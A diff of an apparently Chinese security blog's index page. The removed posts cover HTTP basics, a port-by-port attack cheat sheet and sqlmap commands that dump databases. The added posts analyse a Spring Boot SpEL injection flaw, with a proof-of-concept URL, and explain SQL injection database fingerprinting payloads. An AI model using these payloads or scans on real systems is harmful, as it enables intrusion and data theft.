-<p><strong>3.</strong>端口部分：跟在域名后面的是端口，域名和端口之间使用“:”作为分隔符。端口不是一个URL必须的部分，如果省略端口部分，将采用默认端口</p>
-<p><strong>4.</strong>虚拟目录部分：从域名后的第一个“/”开始到最后一个“/”为止，是虚拟目录部分。虚拟目录也不是一个URL必须的部分。本例中的虚拟目录是“/news/”</p>
-<p><strong>5.</strong>文件名部分：从域名后的最后一个“/”开始到“？”为止，是文件名部分，如果没有“?”,则是从域名后的最后一个“/”开始到“#”为止，是文件部分，如果没有“？”和“#”，那么从域名后的最后一个“/”开始到结束，都是文件名部分。本例中的文件名是“index.asp”。文件名部分也不是一个URL必须的部分，如果省略该部分，则使用默认的文件名</p>
-<p><strong>6.</strong>锚部分：从“#”开始到最后，都是锚部分。本例中的锚部分是“name”。锚部分也不是一个URL必须的部分</p>
-<p><strong>7.</strong>参数部分：从“？”开始到“#”为止之间的部分为参数部分，又称搜索部分、查询部分。本例中的参数部分为“boardID=5&amp;ID=24618&amp;page=1”。参数可以允许有多个参数，参数与参数之间用“&amp;”作为分隔符。</p>
-<h4 id="URI和URL的区别"><a href="#URI和URL的区别" class="headerlink" title="URI和URL的区别"></a>URI和URL的区别</h4><p>URI ，是uniform resource identifier，统一资源标识符，用来唯一的标识一个资源。<br>Web上可用的每种资源如HTML文档、图像、视频片段、程序等都是一个来URI来定位的<br>URI一般由三部组成：<br>①访问资源的命名机制<br>②存放资源的主机名<br>③资源自身的名称，由路径表示，着重强调于资源。</p>
-<p>URL是uniform resource locator，统一资源定位器，它是一种具体的URI，即URL可以用来标识一个资源，而且还指明了如何locate这个资源。<br>URL是Internet上用来描述信息资源的字符串，主要用在各种WWW客户程序和服务器程序上，特别是著名的Mosaic。<br>采用URL可以用一种统一的格式来描述各种信息资源，包括文件、服务器的地址和目录等。URL一般由三部组成：<br>①协议(或称为服务方式)<br>②存有该资源的主机IP地址(有时也包括端口号)<br>③主机资源的具体地址。如目录和文件名等</p>
-<p>URN，uniform resource name，统一资源命名，是通过名字来标识资源，比如mailto:java-net@java.sun.com。<br>URI是以一种抽象的，高层次概念定义统一资源标识，而URL和URN则是具体的资源标识的方式。URL和URN都是一种URI。笼统地说，每个 URL 都是 URI，但不一定每个 URI 都是 URL。这是因为 URI 还包括一个子类，即统一资源名称 (URN)，它命名资源但不指定如何定位资源。上面的 mailto、news 和 isbn URI 都是 URN 的示例。</p>
-<p>在Java的URI中，一个URI实例可以代表绝对的，也可以是相对的，只要它符合URI的语法规则。而URL类则不仅符合语义，还包含了定位该资源的信息，因此它不能是相对的。<br>在Java类库中，URI类不包含任何访问资源的方法，它唯一的作用就是解析。<br>相反的是，URL类可以打开一个到达资源的流。</p>
-<h4 id="HTTP之请求消息Request"><a href="#HTTP之请求消息Request" class="headerlink" title="HTTP之请求消息Request"></a>HTTP之请求消息Request</h4><p>客户端发送一个HTTP请求到服务器的请求消息包括以下格式：</p>
-<h5 id="请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。"><a href="#请求行（request-line）、请求头部（header）、空行和请求数据四个部分组成。" class="headerlink" title="请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。"></a>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</h5><ul>
-<li><p>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent  Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept  image/webp,image/*,*/*;q=0.8</div><div class="line">Referer http://www.imooc.com/</div><div class="line">Accept-Encoding gzip, deflate, sdch</div><div class="line">Accept-Language zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.<br>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。<br>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息<br>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等<br>第三部分：空行，请求头部后面的空行是必须的<br>即使第四部分的请求数据为空，也必须有空行。<br>第四部分：请求数据也叫主体，可以添加任意的其他数据。<br>这个例子的请求数据为空。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
-<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
-<h4 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h4><h5 id="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"><a href="#HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。" class="headerlink" title="HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。"></a>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</h5><p><img src="https://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/" alt="img"></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</div><div class="line">第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</div><div class="line">第二部分：消息报头，用来说明客户端要使用的一些附加信息</div><div class="line">第二行和第三行为消息报头，</div><div class="line">Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</div><div class="line">第三部分：空行，消息报头后面的空行是必须的</div><div class="line">第四部分：响应正文，服务器返回给客户端的文本信息。</div><div class="line">空行后面的html部分为响应正文。</div></pre></td></tr></table></figure>
-<h4 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</div><div class="line">1xx：指示信息--表示请求已接收，继续处理</div><div class="line">2xx：成功--表示请求已被成功接收、理解、接受</div><div class="line">3xx：重定向--要完成请求必须进行更进一步的操作</div><div class="line">4xx：客户端错误--请求有语法错误或请求无法实现</div><div class="line">5xx：服务器端错误--服务器未能实现合法的请求</div></pre></td></tr></table></figure>
-<h4 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h4><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
-<h4 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h4><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
-<p>以下是 HTTP 请求/响应的步骤：</p>
-<p>1、客户端连接到Web服务器<br>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
-<p>2、发送HTTP请求<br>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
-<p>3、服务器接受请求并返回HTTP响应<br>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
-<p>4、释放连接TCP连接<br>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
-<p>5、客户端浏览器解析HTML内容<br>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
-<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
-<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
-<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
-<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
-<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
-<p>5、释放 TCP连接;</p>
-<p>6、浏览器将该 html 文本并显示内容;</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/12/23/HTTP-协议/" data-id="cjc7iqrrf00095s1ba6ngiy2b" class="article-share-link">Partager</a>
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-端口大集合" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2016/12/04/端口大集合/" class="article-date">
-  <time datetime="2016-12-04T02:24:31.000Z" itemprop="datePublished">2016-12-04</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2016/12/04/端口大集合/">端口大集合</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>###1,web类(web漏洞/敏感目录)<br>第三方通用组件漏洞struts thinkphp jboss ganglia zabbix<br>80 web<br>80-89 web<br>8000-9090 web</p>
-<p>###2,数据库类(扫描弱口令)<br>1433 MSSQL<br>1521 Oracle<br>3306 MySQL<br>5432 PostgreSQL</p>
-<p>###3,特殊服务类(未授权/命令执行类/漏洞)<br>443 SSL心脏滴血<br>873 Rsync未授权<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
-<p>###4,常用端口类(扫描弱口令/端口爆破)<br>21 ftp<br>22 SSH<br>23 Telnet<br>2601,2604 zebra路由，默认密码zebra<br>3389 远程桌面<br>端口合计详情<br>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 （国外用较多）<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/12/04/端口大集合/" data-id="cjc7iqrrw000r5s1bmqjics9d" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2017/01/27/任意文件读取漏洞的利用/" data-id="cjca1zrwp000n881b2uavx8ol" class="article-share-link">Share</a>
       
       
     </footer>
@@ -494,7 +178,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" data-id="cjc7iqrrg000b5s1buhuvde70" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/Discuz7-faq-php-Sqli-漏漏洞分析/" data-id="cjca1zrw30006881bqqn5mkad" class="article-share-link">Share</a>
       
       
     </footer>
@@ -582,7 +266,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjc7iqrrk000e5s1bl4zquybp" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/11/15/MVEL解析表达式/" data-id="cjca1zrwe000c881bqa63x5bc" class="article-share-link">Share</a>
       
       
     </footer>
@@ -592,10 +276,10 @@
 
 
   
-    <article id="post-sqlmap-使用" class="article article-type-post" itemscope itemprop="blogPost">
+    <article id="w-Spring-Boot框架SPEL表达式注入漏洞" class="article article-type-w" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2016/08/11/sqlmap-使用/" class="article-date">
-  <time datetime="2016-08-11T03:28:48.000Z" itemprop="datePublished">2016-08-11</time>
+    <a href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" class="article-date">
+  <time datetime="2016-07-15T07:42:14.000Z" itemprop="datePublished">2016-07-15</time>
 </a>
     
   </div>
@@ -606,7 +290,7 @@
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2016/08/11/sqlmap-使用/">sqlmap 使用</a>
+      <a class="article-title" href="/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/">Spring Boot框架SPEL表达式注入漏洞</a>
     </h1>
   
 
@@ -614,19 +298,174 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>sqlmap 是进行sql注入首选的工具，它可以帮助你快速的验证和利用一个sql注入漏洞。你可以在sqlmap的帮助下轻松的利用sql注入漏洞获取数据库数据甚至是getshell。<br>下载安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">git <span class="built_in">clone</span> https://github.com/sqlmapproject/sqlmap.git</div></pre></td></tr></table></figure></p>
-<p>当然，你也可以下载zip包直接解压，地址<a href="https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master" target="_blank" rel="external">https://codeload.github.com/sqlmapproject/sqlmap/legacy.zip/master</a><br>然后解压出来目录其实就可以直接使用了。<br>大部分人只需要这么用<br>直接对一个url进行注入检测,-u参数指定检测的url<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php?user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
-<p>如果是post的参数：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span></div></pre></td></tr></table></figure></p>
-<p>ok，如果输入的参数过多，你可以使用-p来指定具体存在注入的参数，比如指定参数id注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id</div></pre></td></tr></table></figure></p>
-<p>下一步，获取数据库列表<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --dbs</div></pre></td></tr></table></figure></p>
-<p>获取指定数据库的表名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql --tables</div></pre></td></tr></table></figure></p>
-<p>获取指定数据库及指定表的列名<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --columns</div></pre></td></tr></table></figure></p>
-<p>dump数据<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap -u <span class="string">"http://sqltest.com/sql1.php"</span> --data=<span class="string">"user=jack&amp;id=1"</span> -p id --D mysql -T user --dump</div></pre></td></tr></table></figure></p>
+        <p>pring是2003年兴起的轻量级Java开发框架。任何Java应用都可以使用该框架的核心特性，在Java EE平台之上有可用于构建Web应用的扩展。Spring Boot是Spring 的一个核心子项目，其设计目的是用来简化新Spring应用的初始搭建以及开发过程。该框架使用了特定的方式来进行配置，从而使开发人员不再需要定义样板化的配置国内包括百度、阿里巴巴、腾讯等诸多知名企业都在使用该框架。<br>最近Spring Boot框架的SpEL表达式注入通用漏洞曝光，利用该漏洞，远程攻击者在服务器上可执行任意命令。</p>
+<h4 id="受影响的版本"><a href="#受影响的版本" class="headerlink" title="受影响的版本"></a>受影响的版本</h4><p>Spring Boot 1.1 1.2 1.3.0版本</p>
+<h4 id="不受影响的版本"><a href="#不受影响的版本" class="headerlink" title="不受影响的版本"></a>不受影响的版本</h4><p>Spring Boot 1.3.1及以上版本</p>
+<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>以下是官方给的漏洞说明：<br><img src="/upload_image/3.png" alt=""><br>查看spring boot1.3.0的源文件ErrorMvcAutoConfiguration.java，发现出问题的地方主要在SpelView类中：<br><img src="/upload_image/4.png" alt=""><br>经过分析得知在用户采用了Spring Boot启动Spring MVC项目后Spring Boot的默认异常模板在处理异常信息的时候递归解析SPEL表达式，可导致SPEL表达式注入并执行。主要问题是SpelView类中会对路径中或者名字中含有的表达式递归解析，所以在1.3.1修复时添加了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用此漏洞，只需在SpringMVC的Controller中的参数触发一个异常，异常信息带有SPEL表达式就可以注入了。<br>POC：<br><a href="http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}" target="_blank" rel="external">http://localhost:8555/test.php?id=${new%20java.lang.String(new%20byte[]{78,115,102,111,99,117,115})}</a><br>漏洞证明：<br><img src="/upload_image/5.png" alt=""><br>利用表达式成功创建了字符串Nsfocus.</p>
+<h4 id="补丁分析"><a href="#补丁分析" class="headerlink" title="补丁分析"></a>补丁分析</h4><p>从spring-boot的github的项目中可以看到，这个漏洞是在这个commit中修复的：<br><a href="https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/commit/edb16a13ee33e62b046730a47843cb5dc92054e6</a><br>在修复的log里可以看到存着漏洞的1.3.0和1.3.1的差别：<br><img src="/upload_image/6.png" alt=""><br>1.3.1创建了NonRecursivePropertyPlaceholderHelper类，防止递归解析路径中或者名字中含有的表达式。</p>
+<h4 id="修复方法"><a href="#修复方法" class="headerlink" title="修复方法"></a>修复方法</h4><p>升级Spring Boot版本至1.3.1或以上版本</p>
+<h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="http://www.freebuf.com/news/108665.html" target="_blank" rel="external">http://www.freebuf.com/news/108665.html</a><br><a href="http://www.wooyun.org/bugs/wooyun-2010-226888" target="_blank" rel="external">http://www.wooyun.org/bugs/wooyun-2010-226888</a><br><a href="https://github.com/spring-projects/spring-boot/issues/4763" target="_blank" rel="external">https://github.com/spring-projects/spring-boot/issues/4763</a></p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://wsygoogol.github.io/2016/08/11/sqlmap-使用/" data-id="cjc7iqrro000h5s1bamx5rrc5" class="article-share-link">Partager</a>
+      <a data-url="http://wsygoogol.github.io/2016/07/15/Spring-Boot框架SPEL表达式注入漏洞/" data-id="cjca1zrwj000h881bn0hlng41" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+  
+    <article id="post-sql注入之数据库识别" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2016/06/18/sql注入之数据库识别/" class="article-date">
+  <time datetime="2016-06-18T12:01:05.000Z" itemprop="datePublished">2016-06-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2016/06/18/sql注入之数据库识别/">sql注入之数据库识别</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>目前，主流扫描器在性能和准确性上一直是各个厂家追捧的对象，然而由于缺少对一些特定环境的判断，例如，数据库的版本识别，页面相似度的计算，爬虫对单 url扫描时间的采样等，所以导致对于一个sql注入的检测势必会采取全规则扫描，那么对于一个数据库怎样去识别呢，我们可以根据所谓的“指纹”去探索， 数据库的类型。</p>
+<h4 id="根据数据库连接字符串的不同进行识别"><a href="#根据数据库连接字符串的不同进行识别" class="headerlink" title="根据数据库连接字符串的不同进行识别"></a>根据数据库连接字符串的不同进行识别</h4><p>在控制某个字符串数据项的查询中，可以再一个请求中提交一个特殊的值，然后测试个中连接方式，生成自己想要的字符串，如果得到相同的结果，就可以确定所使 用的数据库类型，如果该页面存在sql注入，当然就是用最简单的测试手法，进行探测，如果探测成功，然后就进行字符的连接测试，对于后台如果一个 url：<a href="http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，" target="_blank" rel="external">http://www.site.com/select.php?a=1&amp;b=2，假设存在注入漏洞，注入点是ｂ，你可以加入一下内容，</a> 构造你认为对的注入条件：</p>
+<p>a)  字符串类型：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.   ORACLE：’database‘  || ’_detect‘</div><div class="line">2.   MS-SQL： ’database‘+’_detect‘</div><div class="line">3.   MYSQL：’database‘  ’_detect‘</div></pre></td></tr></table></figure></p>
+<p>b)  数字类型<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE：BITAND(1,1) - BITAND(1,1)</div><div class="line">2.  MS-SQL：@@PACK_RECEIVED - @@PACK_RECEIVED</div><div class="line">3.  MYSQL： CONNECTION_ID() - CONNECTION_ID()</div></pre></td></tr></table></figure></p>
+<p>根据页面的返回特征，如果有你想要看到的现象，那么就可以确定数据库的类别。</p>
+<h4 id="根据数据库默认函数的不同进行识别"><a href="#根据数据库默认函数的不同进行识别" class="headerlink" title="根据数据库默认函数的不同进行识别"></a>根据数据库默认函数的不同进行识别</h4><p>a)  基于时间的</p>
+<ol>
+<li>在oracle之中，没有专门的内置时间函数，但是它有一个向远端服务器发送http请求的内置函数，UTL_HTTP,如果发送一个不存在的远端主机请 求，它就会尝试去连接，这样势必会造成一定程度的延迟。</li>
+<li>在ms-sql之中，可以使用waitfor delay ‘0:0:10’注入参数之中，造成一定的延迟然后和预期的正常请求时间相比较，如果符合自己的预期，那么就可以确定数据库的类型</li>
+<li>在mysql之中，可以使用sleep(5)注入参数之中，造成延迟来判断数据库类型<br>b)  基于错误类型的<br>众所周知对于不同的数据库，如果sql语句触发了错误，它们所爆出来的错误信息是不一样的，当然我们可以试探的形式去发现，例如我们用单引号，双引号，宽字节等有效手段，或者引发除零错之类的触发sql语句的错误，然后从错误信息之中寻找信息<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">ORA-01756:quoted string not properly terminated</div><div class="line">ORA-00933:SQLcommand not properly ended</div><div class="line">2.  MS-SQL</div><div class="line">Msg 170,level 15, State 1,Line 1</div><div class="line">Line 1:Incorrect syntax near ‘foo</div><div class="line">Msg 105,level 15,state 1,Line 1</div><div class="line">Unclose quotation mark before the character string ‘foo</div><div class="line">3.  MYSQL</div><div class="line">you have an error <span class="keyword">in</span> your SQL syntax,check the manual that corresponds to you mysql server version <span class="keyword">for</span> the right stntax to use near ‘’foo’ at line x</div></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>c)  根据注释也可以初步判断数据库类型，但是注释一般可以被程序过滤，所以严格意义上讲，不在考虑范围之内<br>       这里举例就先这些，其实错误信息很多，如果个事实三者中的任意一个，那么就可以确定是哪一种数据库.</p>
+<h4 id="怎样去获取数据库的详细信息"><a href="#怎样去获取数据库的详细信息" class="headerlink" title="怎样去获取数据库的详细信息"></a>怎样去获取数据库的详细信息</h4><p>a)  获取数据库的版本字符串<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select banner from v<span class="variable">$version</span></div><div class="line">2.  MS-SQL</div><div class="line">Select @@version</div><div class="line">3.  MYSQL</div><div class="line">Select @@version</div></pre></td></tr></table></figure></p>
+<p>b)  获取当前操作的数据库<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select SYS_CONTEXT(‘USERENV’,’DBNAME’) from dual</div><div class="line">2.  MS-SQL</div><div class="line">Select db_name()</div><div class="line">获取服务器的名称可以用 select servername</div><div class="line">3.  MYSQL</div><div class="line">Select database()</div></pre></td></tr></table></figure></p>
+<p>c)  获取当前用户的权限<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1.  ORACLE</div><div class="line">Select privilege from session_privs</div><div class="line">2.  MS-SQL</div><div class="line">Select grantee,table_name,privilege_type from</div><div class="line">INFORMATION_SCHEMA.TABLE_PRIVILEGES</div><div class="line">3.  MYSQL</div><div class="line">Select * from information_schema.user_privileges <span class="built_in">where</span> grantee = ‘user’</div><div class="line">这里的user可以来自select user()</div><div class="line">如果要对这些检索出来的信息，进行一列显示，那么就要用到前面提到的连接符号</div></pre></td></tr></table></figure></p>
